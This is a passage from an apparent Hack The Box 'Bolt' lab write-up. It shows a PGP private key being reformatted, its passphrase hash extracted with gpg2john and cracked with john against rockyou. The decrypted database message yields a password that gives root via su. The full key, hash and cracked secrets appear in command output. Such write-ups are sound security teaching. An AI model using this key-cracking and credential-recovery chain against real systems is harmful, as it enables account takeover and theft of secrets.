\\nQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\r\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\r\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw9
9WNw/\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4Uhi
UJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----
```

Formatting it, we’ve got

```bash
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

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
PSwYYWlAywj5=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

Now, let’s use gpg2john to extract the password hash.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation/eddie]
└──╼ [★]$ gpg2john pgp_private_key > hash

File pgp_private_key
```

Checking our hash file.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation/eddie]
└──╼ [★]$ cat hash 
Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::pgp_private_key
```

Now, using john, let’s try to crack it.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation/eddie]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
merrychristmas   (Eddie Johnson)
1g 0:00:07:52 DONE (2022-02-17 18:14) 0.002115g/s 90.64p/s 90.64c/s 90.64C/s mhines..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now, let’s copy the message from the database, import the key to our machine and let’s decrypt the message.

First, the message from database.

![Untitled](Bolt/Untitled%2024.png)

Importing the eddie’s private key.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation/privesc]
└──╼ [★]$ gpg --batch --import ../eddie/pgp_private_key 
gpg: /home/th3g3ntl3m4n/.gnupg/trustdb.gpg: trustdb created
gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson <eddie@bolt.htb>" imported
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

And reading the message.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation/privesc]
└──╼ [★]$ gpg --passphrase merrychristmas -d pgp-message.asc 
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Sat 06 Mar 2021 11:33:54 AM -04
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
```

Let’s try to login as root on host.

```bash
eddie@bolt:~$ su
Password: 
root@bolt:/home/eddie# id
uid=0(root) gid=0(root) groups=0(root)
```

We got root!

![Untitled](Bolt/Untitled%2025.png)